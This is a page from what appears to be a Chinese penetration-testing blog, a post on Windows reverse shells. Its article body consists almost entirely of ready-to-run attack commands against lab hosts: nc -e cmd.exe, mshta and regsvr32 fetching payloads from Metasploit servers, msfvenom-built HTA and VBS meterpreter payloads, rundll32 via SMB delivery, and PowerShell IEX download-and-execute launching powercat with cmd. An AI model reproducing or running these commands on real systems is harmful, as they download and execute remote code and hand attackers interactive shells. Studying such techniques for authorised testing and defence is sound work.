@@ -1,0 +1,390 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="Windows反弹shellNC 反弹 shell 目标无web环境  安装有NC或者能够上传NC   目标机器 1nc -lvvp 6666 -e cmd.exe  攻击机器 1nc 192.168.1.62 6666  Mshta 反弹 shellMshta.exe 是用于负责解释运行 HTA(HTML应用程序)文件的 Windows OS 实用程序。 可以运行 JavaScript 或*VB">
+<meta property="og:type" content="article">
+<meta property="og:title" content="渗透测试--windows系统信息收集与提权-(3)">
+<meta property="og:url" content="http://s1eady.top/2020/11/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--windows%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%8E%E6%8F%90%E6%9D%83-(4)/index.html">
+<meta property="og:site_name" content="steady&#39;s blog">
+<meta property="og:description" content="Windows反弹shellNC 反弹 shell 目标无web环境  安装有NC或者能够上传NC   目标机器 1nc -lvvp 6666 -e cmd.exe  攻击机器 1nc 192.168.1.62 6666  Mshta 反弹 shellMshta.exe 是用于负责解释运行 HTA(HTML应用程序)文件的 Windows OS 实用程序。 可以运行 JavaScript 或*VB">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-11-20T03:51:30.000Z">
+<meta property="article:modified_time" content="2020-12-14T02:01:08.334Z">
+<meta property="article:author" content="steady">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>渗透测试--windows系统信息收集与提权-(3)</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="steady's blog" type="application/atom+xml">
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+         
+          <li><a href="/categories/">分类</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2020/11/20/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0--UAC/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2020/11/12/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--Metasploit%E7%9A%84%E4%BD%BF%E7%94%A8/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://s1eady.top/2020/11/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--windows%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%8E%E6%8F%90%E6%9D%83-(4)/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://s1eady.top/2020/11/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--windows%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%8E%E6%8F%90%E6%9D%83-(4)/&text=渗透测试--windows系统信息收集与提权-(3)"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://s1eady.top/2020/11/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--windows%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%8E%E6%8F%90%E6%9D%83-(4)/&title=渗透测试--windows系统信息收集与提权-(3)"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://s1eady.top/2020/11/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--windows%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%8E%E6%8F%90%E6%9D%83-(4)/&is_video=false&description=渗透测试--windows系统信息收集与提权-(3)"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=渗透测试--windows系统信息收集与提权-(3)&body=Check out this article: http://s1eady.top/2020/11/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--windows%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%8E%E6%8F%90%E6%9D%83-(4)/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://s1eady.top/2020/11/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--windows%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%8E%E6%8F%90%E6%9D%83-(4)/&title=渗透测试--windows系统信息收集与提权-(3)"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://s1eady.top/2020/11/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--windows%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%8E%E6%8F%90%E6%9D%83-(4)/&title=渗透测试--windows系统信息收集与提权-(3)"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://s1eady.top/2020/11/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--windows%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%8E%E6%8F%90%E6%9D%83-(4)/&title=渗透测试--windows系统信息收集与提权-(3)"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://s1eady.top/2020/11/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--windows%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%8E%E6%8F%90%E6%9D%83-(4)/&title=渗透测试--windows系统信息收集与提权-(3)"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://s1eady.top/2020/11/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--windows%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%8E%E6%8F%90%E6%9D%83-(4)/&name=渗透测试--windows系统信息收集与提权-(3)&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://s1eady.top/2020/11/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--windows%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%8E%E6%8F%90%E6%9D%83-(4)/&t=渗透测试--windows系统信息收集与提权-(3)"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.</span> <span class="toc-text">Windows反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#NC-%E5%8F%8D%E5%BC%B9-shell"><span class="toc-number">1.1.</span> <span class="toc-text">NC 反弹 shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Mshta-%E5%8F%8D%E5%BC%B9-shell"><span class="toc-number">1.2.</span> <span class="toc-text">Mshta 反弹 shell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Metasploit-%E7%9A%84-hta-server%E6%A8%A1%E5%9D%97%E5%8F%91%E8%B5%B7-HTA-%E6%94%BB%E5%87%BB"><span class="toc-number">1.2.1.</span> <span class="toc-text">Metasploit 的 hta_server模块发起 HTA 攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E8%BF%87-Msfvenom-%E7%94%9F%E6%88%90%E6%81%B6%E6%84%8F-HTA-%E6%96%87%E4%BB%B6%E5%8F%91%E8%B5%B7%E6%94%BB%E5%87%BB"><span class="toc-number">1.2.2.</span> <span class="toc-text">通过 Msfvenom 生成恶意 HTA 文件发起攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Rundll32-%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.2.3.</span> <span class="toc-text">Rundll32 反弹shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Regsvr32-%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.2.4.</span> <span class="toc-text">Regsvr32 反弹shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Powershell-%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.2.5.</span> <span class="toc-text">Powershell 反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%80%9A%E8%BF%87-PowerShell-%E5%8F%91%E5%8A%A8-Powercat-%E6%94%BB%E5%87%BB"><span class="toc-number">1.2.5.1.</span> <span class="toc-text">通过 PowerShell 发动 Powercat 攻击</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%80%9A%E8%BF%87-PowerShell-%E5%90%AF%E5%8A%A8-cscript-exe-%E6%94%BB%E5%87%BB"><span class="toc-number">1.2.5.2.</span> <span class="toc-text">通过 PowerShell 启动 cscript.exe 攻击</span></a></li></ol></li></ol></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        渗透测试--windows系统信息收集与提权-(3)
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">steady</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-11-20T03:51:30.000Z" itemprop="datePublished">2020-11-20</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="Windows反弹shell"><a href="#Windows反弹shell" class="headerlink" title="Windows反弹shell"></a>Windows反弹shell</h2><h3 id="NC-反弹-shell"><a href="#NC-反弹-shell" class="headerlink" title="NC 反弹 shell"></a>NC 反弹 shell</h3><ul>
+<li><p>目标无web环境</p>
+</li>
+<li><p>安装有NC或者能够上传NC</p>
+</li>
+</ul>
+<p>目标机器</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 6666 -e cmd.exe</span><br></pre></td></tr></table></figure>
+
+<p>攻击机器</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.1.62 6666</span><br></pre></td></tr></table></figure>
+
+<h3 id="Mshta-反弹-shell"><a href="#Mshta-反弹-shell" class="headerlink" title="Mshta 反弹 shell"></a>Mshta 反弹 shell</h3><p>Mshta.exe 是用于负责解释运行 HTA(HTML应用程序)文件的 Windows OS 实用程序。 可以运行 JavaScript 或*VBScript 的 HTML 文件。</p>
+<ul>
+<li>目标机器无web环境</li>
+<li>无法上传任何文件，比如exe木马或者nc或者shell文件等</li>
+</ul>
+<h4 id="Metasploit-的-hta-server模块发起-HTA-攻击"><a href="#Metasploit-的-hta-server模块发起-HTA-攻击" class="headerlink" title="Metasploit 的 hta_server模块发起 HTA 攻击"></a>Metasploit 的 hta_server模块发起 HTA 攻击</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;misc&#x2F;hta_server</span><br><span class="line">msf exploit(windows&#x2F;misc&#x2F;hta_server) &gt; set srvhost 192.168.1.227</span><br><span class="line">msf exploit(windows&#x2F;misc&#x2F;hta_server) &gt; exploit –j</span><br></pre></td></tr></table></figure>
+
+<p>目标机器执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mshta.exe http:&#x2F;&#x2F;192.168.1.227:8080&#x2F;good.hta</span><br></pre></td></tr></table></figure>
+
+<h4 id="通过-Msfvenom-生成恶意-HTA-文件发起攻击"><a href="#通过-Msfvenom-生成恶意-HTA-文件发起攻击" class="headerlink" title="通过 Msfvenom 生成恶意 HTA 文件发起攻击"></a>通过 Msfvenom 生成恶意 HTA 文件发起攻击</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.1.227 lport&#x3D;4444 -f hta-psh -o 1.hta</span><br></pre></td></tr></table></figure>
+
+<p>msf 建立一个反向监听</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; handler -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp -H 192.168.1.227 -P 4444</span><br></pre></td></tr></table></figure>
+
+<p>python 开启web服务，使目标机器可以访问这个恶意文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python –m http.server 8000</span><br></pre></td></tr></table></figure>
+
+<p>在目标机器上命令行中使用 mshta.exe 请求并运行攻击机器上的 hta 文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mshta.exe http:&#x2F;&#x2F;192.168.1.227:8000&#x2F;1.hta</span><br></pre></td></tr></table></figure>
+
+<h4 id="Rundll32-反弹shell"><a href="#Rundll32-反弹shell" class="headerlink" title="Rundll32 反弹shell"></a>Rundll32 反弹shell</h4><p>Rundll32.exe允许调用从DLL导出的函数(16位或32位)，并将其存储在适当的内存库中。</p>
+<p>Metasploit 的 smb_delivery 模块发起Rundll32攻击</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;smb&#x2F;smb_delivery</span><br><span class="line">msf exploit(windows&#x2F;smb&#x2F;smb_delivery) &gt; set srvhost 192.168.1.227</span><br><span class="line">msf exploit(windows&#x2F;smb&#x2F;smb_delivery) &gt; exploit –j</span><br></pre></td></tr></table></figure>
+
+<p>目标机器执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe \\192.168.1.227\obmPU\test.dll,0</span><br></pre></td></tr></table></figure>
+
+<h4 id="Regsvr32-反弹shell"><a href="#Regsvr32-反弹shell" class="headerlink" title="Regsvr32 反弹shell"></a>Regsvr32 反弹shell</h4><p>Regsvr32.exe是一个命令行应用程序，用于注册和注销OLE控件。</p>
+<p>msf 使用 web_delivery 模块，设置参数并执行，生成一条 regsvr32 命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;script&#x2F;web_delivery</span><br><span class="line">msf exploit (web_delivery)&gt; set srvhost 192.168.1.227</span><br><span class="line">msf exploit (web_delivery)&gt; set target 3</span><br><span class="line">msf exploit (web_delivery)&gt; set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">msf exploit (web_delivery)&gt; set lhost 192.168.1.227</span><br><span class="line">msf exploit (web_delivery)&gt; exploit –j</span><br></pre></td></tr></table></figure>
+
+<p>目标机器命令执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regsvr32 &#x2F;s &#x2F;n &#x2F;u &#x2F;i:http:&#x2F;&#x2F;192.168.1.227:8081&#x2F;du3uxIZOGuCH0ZV.sct scrobj.dll</span><br></pre></td></tr></table></figure>
+
+<h4 id="Powershell-反弹shell"><a href="#Powershell-反弹shell" class="headerlink" title="Powershell 反弹shell"></a>Powershell 反弹shell</h4><h5 id="通过-PowerShell-发动-Powercat-攻击"><a href="#通过-PowerShell-发动-Powercat-攻击" class="headerlink" title="通过 PowerShell 发动 Powercat 攻击"></a>通过 PowerShell 发动 Powercat 攻击</h5><p>下载vps上的powercat脚本，vps开启临时服务器，提供下载功能。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python –m http.server 8000</span><br></pre></td></tr></table></figure>
+
+<p>命令行执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -c &quot;IEX(New-Object System.Net.WebClient).DownloadString(&#39;http:&#x2F;&#x2F;192.168.1.227:8000&#x2F;powercat.ps1&#39;);powercat -c 192.168.1.227 -p 1235 -e cmd&quot;</span><br></pre></td></tr></table></figure>
+
+<h5 id="通过-PowerShell-启动-cscript-exe-攻击"><a href="#通过-PowerShell-启动-cscript-exe-攻击" class="headerlink" title="通过 PowerShell 启动 cscript.exe 攻击"></a>通过 PowerShell 启动 cscript.exe 攻击</h5><p>PowerShell 允许客户端通过执行 cscript.exe 来运行 wsf、js 和 vbscript 脚本。</p>
+<p> msfvenom 生成一个 vbs 恶意文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.1.227 lport&#x3D;1234 -f vbs &gt; 1.vbs</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; handler -p windows&#x2F;meterpreter&#x2F;reverse_tcp -H 192.168.1.227 -P 1234</span><br></pre></td></tr></table></figure>
+
+<p>目标服务器开启服务并下载文件然后执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -c &quot;(New-Object System.NET.WebClient).DownloadFile(&#39;http:&#x2F;&#x2F;192.168.1.227:8000&#x2F;1.vbs&#39;,\&quot;$env:temp\test.vbs\&quot;);Start-Process %windir%\system32\cscript.exe \&quot;$env:temp\test.vbs\&quot;&quot;</span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/tags/">标签</a></li>
+         
+          <li><a href="/categories/">分类</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.</span> <span class="toc-text">Windows反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#NC-%E5%8F%8D%E5%BC%B9-shell"><span class="toc-number">1.1.</span> <span class="toc-text">NC 反弹 shell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Mshta-%E5%8F%8D%E5%BC%B9-shell"><span class="toc-number">1.2.</span> <span class="toc-text">Mshta 反弹 shell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Metasploit-%E7%9A%84-hta-server%E6%A8%A1%E5%9D%97%E5%8F%91%E8%B5%B7-HTA-%E6%94%BB%E5%87%BB"><span class="toc-number">1.2.1.</span> <span class="toc-text">Metasploit 的 hta_server模块发起 HTA 攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E8%BF%87-Msfvenom-%E7%94%9F%E6%88%90%E6%81%B6%E6%84%8F-HTA-%E6%96%87%E4%BB%B6%E5%8F%91%E8%B5%B7%E6%94%BB%E5%87%BB"><span class="toc-number">1.2.2.</span> <span class="toc-text">通过 Msfvenom 生成恶意 HTA 文件发起攻击</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Rundll32-%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.2.3.</span> <span class="toc-text">Rundll32 反弹shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Regsvr32-%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.2.4.</span> <span class="toc-text">Regsvr32 反弹shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Powershell-%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.2.5.</span> <span class="toc-text">Powershell 反弹shell</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%80%9A%E8%BF%87-PowerShell-%E5%8F%91%E5%8A%A8-Powercat-%E6%94%BB%E5%87%BB"><span class="toc-number">1.2.5.1.</span> <span class="toc-text">通过 PowerShell 发动 Powercat 攻击</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%80%9A%E8%BF%87-PowerShell-%E5%90%AF%E5%8A%A8-cscript-exe-%E6%94%BB%E5%87%BB"><span class="toc-number">1.2.5.2.</span> <span class="toc-text">通过 PowerShell 启动 cscript.exe 攻击</span></a></li></ol></li></ol></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://s1eady.top/2020/11/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--windows%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%8E%E6%8F%90%E6%9D%83-(4)/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://s1eady.top/2020/11/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--windows%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%8E%E6%8F%90%E6%9D%83-(4)/&text=渗透测试--windows系统信息收集与提权-(3)"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://s1eady.top/2020/11/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--windows%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%8E%E6%8F%90%E6%9D%83-(4)/&title=渗透测试--windows系统信息收集与提权-(3)"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://s1eady.top/2020/11/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--windows%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%8E%E6%8F%90%E6%9D%83-(4)/&is_video=false&description=渗透测试--windows系统信息收集与提权-(3)"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=渗透测试--windows系统信息收集与提权-(3)&body=Check out this article: http://s1eady.top/2020/11/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--windows%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%8E%E6%8F%90%E6%9D%83-(4)/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://s1eady.top/2020/11/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--windows%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%8E%E6%8F%90%E6%9D%83-(4)/&title=渗透测试--windows系统信息收集与提权-(3)"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://s1eady.top/2020/11/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--windows%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%8E%E6%8F%90%E6%9D%83-(4)/&title=渗透测试--windows系统信息收集与提权-(3)"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://s1eady.top/2020/11/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--windows%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%8E%E6%8F%90%E6%9D%83-(4)/&title=渗透测试--windows系统信息收集与提权-(3)"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://s1eady.top/2020/11/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--windows%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%8E%E6%8F%90%E6%9D%83-(4)/&title=渗透测试--windows系统信息收集与提权-(3)"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://s1eady.top/2020/11/20/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--windows%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%8E%E6%8F%90%E6%9D%83-(4)/&name=渗透测试--windows系统信息收集与提权-(3)&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
